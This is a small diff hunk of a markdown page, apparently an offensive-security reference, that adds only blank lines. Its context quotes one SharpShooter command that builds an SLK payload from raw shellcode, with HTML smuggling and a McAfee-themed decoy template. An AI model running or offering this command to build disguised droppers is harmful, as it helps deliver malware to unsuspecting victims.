@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:58.370277+00:00'
 ```bash
 SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee
 ```
+
+
